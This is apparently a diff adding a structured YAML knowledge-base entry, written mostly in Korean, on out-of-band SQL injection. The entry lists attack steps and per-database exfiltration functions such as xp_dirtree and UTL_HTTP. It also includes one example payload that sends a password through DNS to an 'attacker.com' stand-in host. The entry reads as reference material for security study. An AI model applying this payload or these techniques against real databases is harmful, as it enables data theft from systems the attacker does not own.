@@ -1,0 +1,146 @@
+# GR-SEC-TEC-00006: Out-of-Band SQL Injection
+
+identity:
+  id: GR-SEC-TEC-00006
+  name: "Out-of-Band SQL Injection"
+  normalization:
+    normalized_name: "out of band sql injection"
+    normalization_version: "1.0"
+  aliases:
+    - "OOB SQLi"
+    - "DNS Exfiltration SQLi"
+    - "HTTP Exfiltration SQLi"
+    - "대역외 SQLi"
+
+classification:
+  domain: security
+  type: technique
+  abstraction_level: 2
+  gr_coordinates:
+    layer: "L7"
+    zone: "Zone3"
+    tags:
+      - "S-VUL-INJ"
+      - "D-DB-SQL"
+      - "T-ATK-EXFIL"
+      - "T-NET-OOB"
+
+definition:
+  what: |
+    HTTP 응답 채널 외의 별도 채널(DNS, HTTP 요청 등)을 통해
+    데이터를 추출하는 SQL Injection 기법이다. DB 서버가
+    외부 네트워크 요청을 할 수 있을 때 사용한다.
+  why: |
+    In-band(UNION, Error), Blind(Boolean, Time) 모두
+    불가능한 환경에서 최후의 수단이다. 응답이 완전히
+    차단되어도 DNS/HTTP로 데이터를 빼낼 수 있다.
+  how: |
+    1. DB 서버의 외부 통신 가능 여부 확인
+    2. 공격자 제어 서버(DNS, HTTP) 준비
+    3. DBMS별 외부 통신 함수 사용:
+       - MSSQL: xp_dirtree, xp_fileexist, OPENROWSET
+       - Oracle: UTL_HTTP, UTL_INADDR, HTTPURITYPE
+       - MySQL: LOAD_FILE(), INTO OUTFILE (제한적)
+       - PostgreSQL: COPY, dblink
+    4. 데이터를 DNS 서브도메인 또는 HTTP 파라미터로 인코딩
+    5. 예: SELECT LOAD_FILE(CONCAT('\\\\',password,'.attacker.com\\a'))
+
+relations:
+  structural:
+    is_a:
+      - GR-SEC-CON-00002  # SQL Injection
+  conditional:
+    requires:
+      - GR-SEC-CON-00024  # Outbound Network Access (TODO)
+    alternative_to:
+      - GR-SEC-TEC-00001  # UNION-based
+      - GR-SEC-TEC-00002  # Boolean-based
+      - GR-SEC-TEC-00003  # Time-based
+      - GR-SEC-TEC-00004  # Error-based
+  applicability:
+    applies_to:
+      - GR-SEC-CMP-00012  # MSSQL (best support)
+      - GR-SEC-CMP-00013  # Oracle (good support)
+    limited_support:
+      - GR-SEC-CMP-00011  # PostgreSQL (dblink required)
+      - GR-SEC-CMP-00010  # MySQL (very limited)
+
+constraints:
+  - property: effectiveness
+    base_value: 0.6
+    conditions:
+      - when:
+          context_type: network
+          condition: "outbound_blocked == true"
+        then:
+          value: 0.0
+          reason: "외부 통신이 차단되면 사용 불가"
+      - when:
+          context_type: environment
+          condition: "dbms == 'mysql'"
+        then:
+          value: 0.2
+          reason: "MySQL은 OOB 기능이 매우 제한적"
+      - when:
+          context_type: environment
+          condition: "dbms == 'mssql' AND xp_cmdshell_enabled == true"
+        then:
+          value: 0.95
+          reason: "MSSQL + xp_cmdshell은 강력한 OOB 가능"
+
+properties:
+  security:
+    severity: high
+    attack_phase: exploitation
+    data_exfiltration: true
+    speed: medium
+    stealth: medium
+    requires_external_server: true
+    dbms_functions:
+      mssql: "xp_dirtree, xp_fileexist, OPENROWSET, xp_cmdshell"
+      oracle: "UTL_HTTP.REQUEST, UTL_INADDR, HTTPURITYPE"
+      postgresql: "COPY, dblink_connect"
+      mysql: "LOAD_FILE (UNC path on Windows)"
+
+metadata:
+  trust:
+    source: research
+    confidence: 1.0
+    verified:
+      status: verified
+      date: "2025-01-26"
+      by: "security-research"
+  temporal:
+    created: "2025-01-26"
+    modified: "2025-01-26"
+    revision: 1
+  lineage:
+    ingested_from:
+      source_type: document
+      source_uri: "../00_Foundation/01_SQLi_Complete_Guide.md"
+      ingestion_date: "2025-01-26"
+      ingestion_method: "expert_extraction"
+    transformations: []
+  security:
+    sensitivity: public
+    weaponization_risk: high
+  ai:
+    embedding_text: |
+      Out-of-Band SQL Injection은 DNS나 HTTP 같은 별도 채널로
+      데이터를 추출하는 기법이다. 응답 채널이 완전히 차단되어도
+      사용 가능한 최후의 수단이다. MSSQL의 xp_dirtree, Oracle의
+      UTL_HTTP가 대표적이다. 데이터를 DNS 서브도메인이나 HTTP
+      파라미터로 인코딩하여 공격자 서버로 전송한다. 외부 통신이
+      가능해야 하며, 방화벽 설정에 크게 영향받는다.
+    search_keywords:
+      - "Out-of-Band SQLi"
+      - "OOB SQLi"
+      - "DNS Exfiltration"
+      - "xp_dirtree"
+      - "UTL_HTTP"
+      - "대역외"
+      - "OPENROWSET"
+    related_queries:
+      - "OOB SQLi는 어떻게 하는가?"
+      - "DNS로 데이터를 추출하는 방법은?"
+      - "Blind도 안 되면 어떻게 하는가?"
